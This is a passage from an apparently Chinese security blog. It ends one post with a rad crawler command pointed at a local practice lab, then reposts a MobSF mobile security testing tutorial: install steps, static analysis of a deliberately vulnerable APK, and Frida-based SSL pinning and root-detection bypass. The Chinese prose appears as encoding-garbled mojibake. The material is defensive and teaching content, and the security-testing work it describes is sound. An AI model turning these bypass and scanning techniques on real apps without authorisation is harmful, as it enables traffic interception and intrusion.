<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rad -t http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/pikachu/ -http-proxy <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7777</span>  -wait-login</span><br></pre></td></tr></table></figure>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Rad/" rel="tag">Rad</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Xray/" rel="tag">Xray</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/MobSF/">
                MobSFç§»åŠ¨å®‰å…¨æµ‹è¯•æ¡†æ¶|è‡ªåŠ¨åŒ–é™åŠ¨æ€appåˆ†ææ¡†æ¶
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="mobsfç§»åŠ¨å®‰å…¨æµ‹è¯•æ¡†æ¶è‡ªåŠ¨åŒ–é™åŠ¨æ€appåˆ†ææ¡†æ¶">MobSFç§»åŠ¨å®‰å…¨æµ‹è¯•æ¡†æ¶|è‡ªåŠ¨åŒ–é™åŠ¨æ€appåˆ†ææ¡†æ¶</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.ddosi.org/mobsf/">é›¨è‹</a> å¹¶ä½œè¡¥å……</p>
<p>ç§»åŠ¨å®‰å…¨æ¡†æ¶ï¼ˆMobSFï¼‰æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–çš„å¤šåˆä¸€ç§»åŠ¨åº”ç”¨ç¨‹åº(Android&#x2F;iOS&#x2F;Windows)å¯ä»¥è¿›è¡Œé™æ€å’ŒåŠ¨æ€åˆ†æçš„æ¸—é€æµ‹è¯•ï¼Œæ¶æ„è½¯ä»¶åˆ†æå’Œå®‰å…¨è¯„ä¼°æ¡†æ¶ã€‚MobSFæ”¯æŒç§»åŠ¨åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆAPKï¼ŒXAPKï¼ŒIPAå’ŒAPPXï¼‰ä»¥åŠå‹ç¼©çš„æºä»£ç ï¼Œå¹¶æä¾›REST APIä»¥ä¸CI &#x2F; CDæˆ–DevSecOpsç®¡é“æ— ç¼é›†æˆã€‚åŠ¨æ€åˆ†æå™¨å¯å¸®åŠ©æ‚¨æ‰§è¡Œè¿è¡Œæ—¶å®‰å…¨æ€§è¯„ä¼°å’Œäº¤äº’å¼æ£€æµ‹ã€‚</p>
</blockquote>
<h2><span id="è¿è¡Œæˆªå›¾ç¤ºä¾‹">è¿è¡Œæˆªå›¾ç¤ºä¾‹</span></h2><h3><span id="é™æ€åˆ†æ-android">é™æ€åˆ†æ-Android</span></h3><blockquote>
<p><img src="/2024/01/19/MobSF/1.gif" alt="image"></p>
</blockquote>
<h3><span id="é™æ€åˆ†æ-androidæºæ ‘çŠ¶è§†å›¾">é™æ€åˆ†æ-Androidæºæ ‘çŠ¶è§†å›¾</span></h3><blockquote>
<p><img src="/2024/01/19/MobSF/2.gif" alt="image"></p>
</blockquote>
<h3><span id="é™æ€åˆ†æ-ios">é™æ€åˆ†æ-iOS</span></h3><blockquote>
<p><img src="/2024/01/19/MobSF/3.gif" alt="image"></p>
</blockquote>
<h3><span id="åŠ¨æ€åˆ†æ-android-apk">åŠ¨æ€åˆ†æ-Android APK</span></h3><blockquote>
<p><img src="/2024/01/19/MobSF/4.gif" alt="image"></p>
</blockquote>
<h3><span id="web-apiæŸ¥çœ‹å™¨">Web APIæŸ¥çœ‹å™¨</span></h3><blockquote>
<p><img src="/2024/01/19/MobSF/5.gif" alt="image"></p>
</blockquote>
<h2><span id="é¡¹ç›®åœ°å€">é¡¹ç›®åœ°å€:</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Github</a></p>
</blockquote>
<h2><span id="å®‰è£…æ–¹æ³•">å®‰è£…æ–¹æ³•</span></h2><blockquote>
<p><strong>requirements.txt</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Django&gt;=<span class="number">3.1</span><span class="number">.5</span></span><br><span class="line">lxml&gt;=<span class="number">4.6</span><span class="number">.2</span></span><br><span class="line">rsa&gt;=<span class="number">4.7</span></span><br><span class="line">biplist&gt;=<span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">requests&gt;=<span class="number">2.25</span><span class="number">.1</span></span><br><span class="line">bs4&gt;=<span class="number">0.0</span><span class="number">.1</span></span><br><span class="line">colorlog&gt;=<span class="number">4.7</span><span class="number">.2</span></span><br><span class="line">macholib&gt;=<span class="number">1.14</span></span><br><span class="line">whitenoise&gt;=<span class="number">5.2</span><span class="number">.0</span></span><br><span class="line">waitress&gt;=<span class="number">1.4</span><span class="number">.4</span>;platform_system==<span class="string">&#x27;Windows&#x27;</span></span><br><span class="line">gunicorn&gt;=<span class="number">20.0</span><span class="number">.4</span>;platform_system!=<span class="string">&#x27;Windows&#x27;</span></span><br><span class="line">psutil&gt;=<span class="number">5.8</span><span class="number">.0</span></span><br><span class="line">shelljob&gt;=<span class="number">0.6</span><span class="number">.2</span></span><br><span class="line">asn1crypto&gt;=<span class="number">1.4</span><span class="number">.0</span></span><br><span class="line">oscrypto&gt;=<span class="number">1.2</span><span class="number">.1</span></span><br><span class="line">distro&gt;=<span class="number">1.5</span><span class="number">.0</span></span><br><span class="line">IP2Location&gt;=<span class="number">8.5</span><span class="number">.1</span></span><br><span class="line">lief&gt;=<span class="number">0.11</span><span class="number">.0</span></span><br><span class="line">http-tools&gt;=<span class="number">2.1</span><span class="number">.0</span></span><br><span class="line">libsast&gt;=<span class="number">1.3</span><span class="number">.7</span></span><br><span class="line">pdfkit&gt;=<span class="number">0.6</span><span class="number">.1</span></span><br><span class="line">google-play-scraper&gt;=<span class="number">0.1</span><span class="number">.2</span></span><br><span class="line">androguard==<span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">apkid==<span class="number">2.1</span><span class="number">.2</span></span><br><span class="line">frida==<span class="number">14.2</span><span class="number">.8</span></span><br><span class="line"><span class="comment"># For semgrep</span></span><br><span class="line">ruamel.yaml==<span class="number">0.16</span><span class="number">.10</span>  <span class="comment"># pyup: ignore</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œåªè¦æ‚¨å·²å®‰è£…æ–‡æ¡£ä¸­çš„æ‰€æœ‰è¦æ±‚ï¼Œå°±å¯ä»¥ä»pypi <a target="_blank" rel="noopener" href="https://pypi.org/project/mobsf/%E5%AE%89%E8%A3%85mobsf">https://pypi.org/project/mobsf/å®‰è£…mobsf</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line"></span><br><span class="line">pip wheel --wheel-dir=yara-python --build-option=<span class="string">&quot;build&quot;</span> --build-option=<span class="string">&quot;--enable-dex&quot;</span> git+https://github.com/VirusTotal/yara-python.git@v3.11.0</span><br><span class="line">pip install --no-index --find-links=yara-python yara-python</span><br><span class="line"></span><br><span class="line">pip install mobsf</span><br><span class="line">mobsfdb <span class="comment"># è¿ç§»æ•°æ®åº“</span></span><br><span class="line">mobsf 127.0.0.1:8000 <span class="comment"># è¿è¡Œmobsf</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="linuxç³»ç»Ÿå®‰è£…æ–¹æ³•">linuxç³»ç»Ÿå®‰è£…æ–¹æ³•</span></h3><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/MobSF/Mobile-Security-Framework-MobSF.git</span><br><span class="line"><span class="built_in">cd</span> Mobile-Security-Framework-MobSF</span><br><span class="line">apt-get install python3-venv</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€é“¾æ¥(0.0.0.0:8000)ï¼ŒæŸ¥çœ‹MobSFæ˜¯å¦å·²æ­£ç¡®å®‰è£…ã€‚</p>
<p><img src="/2024/01/19/MobSF/6.png" alt="image"></p>
</blockquote>
<h3><span id="ç™»é™†é¡µé¢">ç™»é™†é¡µé¢</span></h3><blockquote>
<p>ç°åœ¨MobSFå·²å¯åŠ¨å¹¶æ­£åœ¨è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥å°†è™šæ‹ŸAPKï¼ˆåœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘å°†ä½¿ç”¨Kyle Benacçš„InjuredAndroidï¼ˆ<a target="_blank" rel="noopener" href="https://github.com/B3nac/InjuredAndroid">åœ¨æ­¤å¤„</a>ï¼‰ï¼‰æ”¾å…¥MobSFç•Œé¢ï¼Œç„¶åçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ç­‰å¾…å‡ åˆ†é’Ÿåï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹APKè¿›è¡Œäº†é™æ€åˆ†æã€‚ç°åœ¨ï¼Œåœ¨ç™»å½•é¡µé¢ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç»™å‡ºäº†ä¸¥é‡æ€§è¯„åˆ†ã€‚æ­¤åˆ†æ•°è¶Šé«˜ï¼Œåº”ç”¨ç¨‹åºè¶Šå®‰å…¨ã€‚æ¥ä¸‹æ¥ï¼Œè¿˜ç»™å‡ºäº†å“ˆå¸Œï¼ŒAPKçš„æ–‡ä»¶åå’Œå¤§å°ã€‚åœ¨ç¬¬ä¸€è¡Œçš„ç¬¬ä¸‰åˆ—ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°è½¯ä»¶åŒ…åç§°ï¼Œä¸»è¦æ´»åŠ¨ï¼Œæœ€å°SDKç‰ˆæœ¬å’Œåº”ç”¨ç¨‹åºç‰ˆæœ¬ã€‚è¿˜ç»™å‡ºäº†åº”ç”¨ç¨‹åºçš„æè¿°ã€‚</p>
<p><img src="/2024/01/19/MobSF/7.png" alt="image"></p>
<p>å‘ä¸‹æ»šåŠ¨ä¸€ç‚¹åï¼Œæˆ‘ä»¬å°†çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>åœ¨å°å¡ç‰‡ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸åŒçš„åº”ç”¨ç¨‹åºç»„ä»¶</li>
<li>åŠ¨æ€åˆ†æé€‰é¡¹å°†å¸®åŠ©MobSFè¿›è¡Œè¿è¡Œæ—¶åˆ†æ</li>
<li>æŸ¥çœ‹åç¼–è¯‘ä»£ç çš„é€‰é¡¹ã€‚è¿™æ˜¯apktoolç”Ÿæˆçš„ä»£ç ã€‚é€šå¸¸ï¼Œèµ„æºæ–‡ä»¶ä¹Ÿå°†è¢«è§£ç ã€‚ä¹Ÿå¯ä»¥æŸ¥çœ‹smaliä»£ç ã€‚ä½¿ç”¨å®ƒï¼Œå¯ä»¥æ›´è½»æ¾åœ°åœ¨å•ç‹¬çš„Javaç±»ä¸­åˆ†ç¦»å’ŒæŸ¥çœ‹æºä»£ç ã€‚</li>
</ul>
<p><img src="/2024/01/19/MobSF/8.png" alt="image"></p>
</blockquote>
<h3><span id="ç­¾ç½²è€…è¯ä¹¦åˆ†æ">ç­¾ç½²è€…è¯ä¹¦åˆ†æ</span></h3><blockquote>
<p>åœ¨è¯ä¹¦åˆ—ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç­¾ç½²è€…è¯ä¹¦ï¼Œåœ¨å…¶ä¸­å¯ä»¥æ‰¾åˆ°æœ‰å…³å¼€å‘äººå‘˜ï¼Œå›½å®¶&#x2F;åœ°åŒºï¼Œå·ï¼Œç®—æ³•ç±»å‹ï¼Œä½å¤§å°ç­‰çš„é‡è¦ä¿¡æ¯ã€‚</p>
<p><img src="/2024/01/19/MobSF/9.png" alt="image"></p>
</blockquote>
<h3><span id="ç”³è¯·æƒé™">ç”³è¯·æƒé™</span></h3><blockquote>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åº”ç”¨ç¨‹åºå…·æœ‰çš„æ‰€æœ‰æƒé™ã€‚<br>æœ‰å„ç§æƒé™è¢«åˆ†ç±»ä¸ºå±é™©æˆ–æ­£å¸¸ã€‚<br>ä»å®‰å…¨åˆ†æäººå‘˜çš„è§’åº¦æ¥çœ‹ï¼Œé‡è¦çš„æ˜¯è¦äº†è§£å“ªäº›æƒé™å¯èƒ½å¯¼è‡´è¿›ä¸€æ­¥çš„æŸå®³ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå¯ä»¥è®¿é—®å¤–éƒ¨åª’ä½“å¹¶å°†å…³é”®ä¿¡æ¯å­˜å‚¨åœ¨å¤–éƒ¨åª’ä½“ä¸Šï¼Œåˆ™å¯èƒ½ä¼šå¾ˆå±é™©ï¼Œå› ä¸ºå­˜å‚¨åœ¨å¤–éƒ¨åª’ä½“ä¸Šçš„æ–‡ä»¶æ˜¯å…¨å±€å¯è¯»å’Œå¯å†™çš„ã€‚</p>
<p><img src="/2024/01/19/MobSF/10.png" alt="image"></p>
</blockquote>
<h3><span id="å¯æµè§ˆçš„æ´»åŠ¨å’Œç½‘ç»œå®‰å…¨åˆ†æ">å¯æµè§ˆçš„æ´»åŠ¨å’Œç½‘ç»œå®‰å…¨åˆ†æ</span></h3><blockquote>
<p>æ¥ä¸‹æ¥ï¼Œåœ¨â€œå¯æµè§ˆçš„æ´»åŠ¨â€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ç°äº†æ·±å±‚é“¾æ¥æ¶æ„çš„æ‰€æœ‰æ´»åŠ¨ã€‚è¯·å‚è€ƒ**<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/android-pentest-deep-link-exploitation/">æ­¤å¤„</a>** çš„æ–‡ç« **<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/android-pentest-deep-link-exploitation/">ï¼Œ</a>**ä»¥äº†è§£æœ‰å…³æ·±å±‚é“¾æ¥ï¼Œå…¶å®ç°ä»¥åŠå¼€å‘çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p>
<p>åœ¨â€œç½‘ç»œå®‰å…¨â€éƒ¨åˆ†ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³ä¸åº”ç”¨ç¨‹åºç›¸å…³çš„ç½‘ç»œå®‰å…¨é—®é¢˜çš„ä¸€äº›è¯¦ç»†ä¿¡æ¯ã€‚è¿™äº›é—®é¢˜æœ‰æ—¶ä¼šå¯¼è‡´ç±»ä¼¼MiTMçš„ä¸¥é‡æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„å±å¹•æˆªå›¾ä¸­ï¼Œæ‚¨å¯ä»¥å‘ç°è¯¥åº”ç”¨ç¨‹åºæœªä½¿ç”¨å·²å®ç°çš„SSLå›ºå®šæœºåˆ¶ã€‚</p>
<p><img src="/2024/01/19/MobSF/11.png" alt="image"></p>
</blockquote>
<h3><span id="æ¸…å•åˆ†æ">æ¸…å•åˆ†æ</span></h3><blockquote>
<p>åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼ŒMobSFåˆ†æäº†æ¸…å•æ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä»androidæ¸…å•æ–‡ä»¶ä¸­æ‰¾åˆ°è®¸å¤šä¿¡æ¯ï¼Œä¾‹å¦‚å¯¼å‡ºäº†å“ªäº›æ´»åŠ¨ï¼Œæ˜¯å¦å¯è°ƒè¯•åº”ç”¨ç¨‹åºï¼Œæ•°æ®æ¨¡å¼ç­‰ã€‚æœ‰å…³å‚è€ƒï¼Œè¯·å‚è§ä¸‹é¢çš„å±å¹•æˆªå›¾ã€‚</p>
<p><img src="/2024/01/19/MobSF/12.png" alt="image"></p>
</blockquote>
<h3><span id="ä»£ç åˆ†æ">ä»£ç åˆ†æ</span></h3><blockquote>
<p>MobSFå·¥å…·æœ€æœ‰è¶£çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯ä»£ç åˆ†æéƒ¨åˆ†ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°MobSFå·²ç»åŸºäºOWASP MSTGç­‰è¡Œä¸šå®‰å…¨æ ‡å‡†åšæ³•å¯¹åº”ç”¨ç¨‹åºçš„æŸäº›è¡Œä¸ºè¿›è¡Œäº†åˆ†æå’Œæ¯”è¾ƒï¼Œå¹¶å°†æ¼æ´æ˜ å°„åˆ°OWASP Top10ã€‚æœ‰è¶£çš„æ˜¯ï¼Œåœ¨è¿™é‡Œæåˆ°äº†CWEå’ŒCVSSè¯„åˆ†ï¼Œè¿™å¾ˆæœ‰è¶£ã€‚å¯èƒ½ä¼šå¸®åŠ©å„ç§åˆ†æäººå‘˜æ–¹æ¡ˆï¼Œå¹¶æœ‰åŠ©äºæ›´è½»æ¾åœ°åˆ›å»ºæŠ¥å‘Šã€‚</p>
<p><img src="/2024/01/19/MobSF/13.png" alt="image"></p>
</blockquote>
<h3><span id="ç›¸å…³æ¶æ„è½¯ä»¶åˆ†æ">ç›¸å…³æ¶æ„è½¯ä»¶åˆ†æ</span></h3><blockquote>
<p>MobSFè¿˜æ‰˜ç®¡æä¾›APKiDåˆ†æçš„éƒ¨åˆ†ã€‚APKiDæ˜¯ä¸€ä¸ªå¼€æºå·¥å…·ï¼Œå¯¹è¯†åˆ«Androidæ–‡ä»¶ä¸­çš„å„ç§æ‰“åŒ…ç¨‹åºï¼Œç¼–è¯‘å™¨ï¼Œæ··æ·†å™¨ç­‰éå¸¸æœ‰ç”¨ã€‚å®ƒç±»ä¼¼äºAPKä¸­çš„PEiDã€‚åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å®ƒå·²åœ¨APKä¸­æ£€æµ‹åˆ°åVMä»£ç ã€‚</p>
<p><img src="/2024/01/19/MobSF/14.png" alt="image"></p>
<p>ä¸æ¶æ„è½¯ä»¶åˆ†ææœ‰å…³çš„æ˜¯åŸŸæ¶æ„è½¯ä»¶æ£€æŸ¥åŠŸèƒ½ã€‚MobSFåœ¨è¿™é‡Œæå–æ‰€æœ‰ç»è¿‡ç¡¬ç¼–ç æˆ–åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨è¿‡çš„URL &#x2F; IPåœ°å€ï¼Œå¹¶æ˜¾ç¤ºå…¶æ¶æ„è½¯ä»¶çŠ¶æ€ï¼Œå¹¶ä½¿ç”¨ip2locationç»™å‡ºå…¶åœ°ç†ä½ç½®ã€‚</p>
<p><img src="/2024/01/19/MobSF/15.png" alt="image"></p>
<p>è¿˜å¯ä»¥è¿›è¡Œå…¨é¢çš„å­—ç¬¦ä¸²åˆ†æã€‚çŸ¥é“æ¶æ„è½¯ä»¶åˆ†æçš„äººå‘˜ä¼šæ·±å…¥äº†è§£å­—ç¬¦ä¸²ï¼Œä½†å¯¹äºé‚£äº›ä¸äº†è§£å­—ç¬¦ä¸²çš„äººï¼Œå­—ç¬¦ä¸²æ˜¯æ–‡ä»¶ä¸­åµŒå…¥çš„ASCIIå’ŒUnicodeå¯æ‰“å°å­—ç¬¦åºåˆ—ã€‚æå–å­—ç¬¦ä¸²å¯ä»¥æä¾›æœ‰å…³ç¨‹åºåŠŸèƒ½å’Œä¸å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶å…³è”çš„æŒ‡ç¤ºç¬¦çš„çº¿ç´¢ã€‚ä¾‹å¦‚ï¼Œå¦‚æœAPKå°†æŸäº›å†…å®¹æ˜¾ç¤ºä¸ºè¾“å‡ºï¼Œåˆ™è¯¥æµå°†è¢«è°ƒç”¨å¹¶å› æ­¤æ˜¾ç¤ºåœ¨å­—ç¬¦ä¸²ä¸­ã€‚è¿™ä¸strings.xmlæ–‡ä»¶ä¸åŒã€‚å¾ˆå¤šæ—¶å€™ï¼Œä¸APKé€šä¿¡çš„ç¬¬ä¸‰æ–¹IPåœ°å€åœ¨æ­¤å¤„å¯è§ã€‚ä»æ¶æ„è½¯ä»¶åˆ†æçš„è§’åº¦æ¥çœ‹ï¼Œè¿™æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<p><img src="/2024/01/19/MobSF/16.png" alt="image"></p>
<p>äººä»¬è¿˜å¯ä»¥åœ¨MobSFä¸­æ‰¾åˆ°ç¡¬ç¼–ç çš„ç”µå­é‚®ä»¶ã€‚å…¨éƒ¨ä½¿ç”¨åç¼–è¯‘çš„æºä»£ç å®Œæˆã€‚é€šå¸¸ï¼Œä¸€ä¸ªpentesterå¯ä»¥æ‰¾åˆ°ä¸€äº›é‡è¦çš„ç”µå­é‚®ä»¶IDï¼Œè¿™äº›ç”µå­é‚®ä»¶IDåœ¨ç¬¬ä¸‰æ–¹ç«™ç‚¹ä¸Šè¢«ç”¨ä½œå‡­è¯ï¼Œä¾‹å¦‚ï¼Œç”¨äºè®¿é—®æ•°æ®åº“ã€‚</p>
<p><img src="/2024/01/19/MobSF/17.png" alt="image"></p>
<p>å°±åƒç”µå­é‚®ä»¶ä¸€æ ·ï¼ŒURLä¹Ÿç»å¸¸è¢«ç¡¬ç¼–ç ã€‚äººä»¬å¯ä»¥æ‰¾åˆ°æœ‰æ—¶æ­£åœ¨ä½¿ç”¨çš„å¤šæ±URLã€‚åˆ†æå¸ˆç»å¸¸å‘ç°æ¶æ„URLç”šè‡³æ˜¯Cï¼†CæœåŠ¡å™¨ä¹Ÿè¢«è®¿é—®ã€‚</p>
<p><img src="/2024/01/19/MobSF/18.png" alt="image"></p>
</blockquote>
<h3><span id="ç¡¬ç¼–ç çš„ç§˜å¯†">ç¡¬ç¼–ç çš„ç§˜å¯†</span></h3><blockquote>
<p>é€šå¸¸ï¼Œå¼€å‘äººå‘˜ä¹ æƒ¯äºåœ¨string.xmlä¸­å­˜å‚¨è¯¸å¦‚AWS IDå’Œå‡­è¯ä¹‹ç±»çš„å…³é”®å¯†é’¥ï¼Œå¹¶åœ¨Javaæ´»åŠ¨ä¸­ä½¿ç”¨å¯¹è±¡ä½œä¸ºå¼•ç”¨ã€‚ä½†æ˜¯è¿™æ ·åšæ²¡æœ‰ä»»ä½•å¸®åŠ©ï¼Œå› ä¸ºstrings.xmlå¯ä»¥è½»æ¾è§£ç ã€‚</p>
<p><img src="/2024/01/19/MobSF/19.png" alt="image"></p>
</blockquote>
<h3><span id="æ´»åŠ¨ç»„ä»¶å­˜åœ¨">æ´»åŠ¨ç»„ä»¶å­˜åœ¨</span></h3><blockquote>
<p>ä½¿ç”¨MobSFè¿˜å¯æ»šåŠ¨æ˜¾ç¤ºæ‰€æœ‰å­˜åœ¨çš„æ´»åŠ¨çš„åˆ—è¡¨ã€‚è¿™å¯ä»¥æ·±å…¥äº†è§£Android APKçš„éª¨æ¶ã€‚å¦å¤–ï¼Œå¦‚æœå¼€å‘äººå‘˜è¿›è¡Œäº†æ··æ·†å¤„ç†ï¼Œæœ‰æ—¶jadxä¼šç”¨ä¸€äº›éšæœºå­—æ¯æ›¿æ¢ç±»çš„çœŸå®åç§°ï¼ŒMobSFä¹Ÿå¯ä»¥å…³è”å…¶çœŸå®åç§°ï¼ˆå¹¶éä¸€ç›´å­˜åœ¨æˆ–åœ¨å¼ºçƒˆæ··æ·†çš„æƒ…å†µä¸‹ä¸ä¼šå‘ç”Ÿï¼‰ã€‚</p>
<p><img src="/2024/01/19/MobSF/20.png" alt="image"></p>
<p>åŒæ ·ï¼Œåˆ†æå¸ˆä¹Ÿå¯ä»¥éå†æœåŠ¡ï¼Œå¹¿æ’­ï¼Œæä¾›è€…å’Œå†…å®¹æ¥æ”¶è€…ä»¥åŠAPKå­˜æ¡£ä¸­å­˜åœ¨çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä»¥åˆ›å»ºåº”ç”¨ç¨‹åºä¸­å­˜åœ¨çš„æ‰€æœ‰èµ„æºçš„åœ°å›¾ã€‚</p>
<p><img src="/2024/01/19/MobSF/21.png" alt="image"></p>
</blockquote>
<h3><span id="åŠ¨æ€åˆ†æä»ª">åŠ¨æ€åˆ†æä»ª</span></h3><blockquote>
<p>ä¸ºäº†è¿›è¡ŒåŠ¨æ€åˆ†æï¼Œæˆ‘ä»¬éœ€è¦å…ˆåœ¨genymotionä¸­å¯åŠ¨android VMã€‚åœ¨è¿™é‡Œï¼Œæˆ‘å·²ç»åœ¨7.1ç‰ˆä¸Šåˆ›å»ºäº†ä¸€ä¸ªAndroid VM</p>
<p><img src="/2024/01/19/MobSF/22.png" alt="image"></p>
<p>å½“æ‚¨æŒ‰é¡¶éƒ¨å¯¼èˆªçª—æ ¼ä¸Šçš„åŠ¨æ€åˆ†æå™¨é€‰é¡¹æ—¶ï¼Œå¦‚æœMobSFå’Œgenymotionåœ¨åŒä¸€å°åŸºæœ¬è®¡ç®—æœºä¸Šè¿è¡Œï¼Œåˆ™MobSFå°†è‡ªåŠ¨å°†å…¶è‡ªèº«é™„åŠ åˆ°æ­£åœ¨è¿è¡Œçš„VMã€‚ä½†æ˜¯ï¼Œå¦‚æœMobSFåœ¨å¦ä¸€ä¸ªè™šæ‹Ÿæœºä¸­ï¼Œåˆ™å¯èƒ½å¿…é¡»å°†MobSFä»£ç†é™„åŠ åˆ°genymotionçš„VMçš„è¿œç¨‹IPå’Œç«¯å£ã€‚è¿æ¥åï¼Œæˆ‘ä»¬å°†çœ‹åˆ°ä»¥ä¸‹å±å¹•ã€‚</p>
<p><img src="/2024/01/19/MobSF/23.png" alt="image"></p>
<p>åœ¨åˆ†æå™¨çŠ¶æ€æ ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å„ç§å¯ç”¨çš„é»˜è®¤fridaè„šæœ¬ï¼Œè¿™äº›è„šæœ¬å¯ä»¥æ£€æŸ¥å„ç§åŸºæœ¬æ¼æ´ï¼Œä¾‹å¦‚SSLå›ºå®šç»•è¿‡å’Œæ ¹æ£€æµ‹ã€‚å¦‚æœæ‚¨è¿˜æ²¡æœ‰é˜…è¯»æœ‰å…³fridaçš„ä¿¡æ¯ï¼Œè¯·é€šè¿‡<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/android-penetration-testing-frida/">æ­¤å¤„é˜…è¯»</a>ã€‚è¿˜æœ‰å…¶ä»–è¾…åŠ©è„šæœ¬ï¼Œä½¿åˆ†æäººå‘˜å¯ä»¥æšä¸¾å„ç§ç±»ï¼Œè¿˜å¯ä»¥å®æ—¶æ•è·å­—ç¬¦ä¸²æ¯”è¾ƒï¼ˆå†æ¬¡æœ‰åŠ©äºæ¶æ„è½¯ä»¶åˆ†æäººå‘˜çš„è§‚ç‚¹ï¼‰ã€‚ç„¶åï¼Œåªéœ€å•å‡»â€œå¼€å§‹æ£€æµ‹â€ï¼Œé€‰å®šçš„è„šæœ¬å°†è‡ªåŠ¨é™„åŠ åˆ°åº”ç”¨ç¨‹åºã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘é€‰æ‹©äº†SSL Pinningç»•è¿‡è„šæœ¬ï¼Œå¹¶ä¸”æ•è·äº†æµé‡ï¼ˆä»¥ååœ¨æ—¥å¿—æˆ–APIç›‘è§†å™¨ä¸­å¯è§ï¼‰ï¼Œé‚£å°†æ„å‘³ç€SSL Pinningè¢«ç»•è¿‡äº†ã€‚</p>
<p><img src="/2024/01/19/MobSF/24.png" alt="image"></p>
<p>ç°åœ¨ï¼Œè¦è¿›ä¸€æ­¥åˆ†ææ´»åŠ¨çš„æ¼æ´ï¼Œå¯ä»¥åœ¨é¡¶éƒ¨çœ‹åˆ°ä¸¤ä¸ªæŒ‰é’®ï¼Œåˆ†åˆ«ç”¨äºå·²å¯¼å‡ºå’Œæœªå¯¼å‡ºçš„æ´»åŠ¨</p>
<p><img src="/2024/01/19/MobSF/25.png" alt="image"></p>
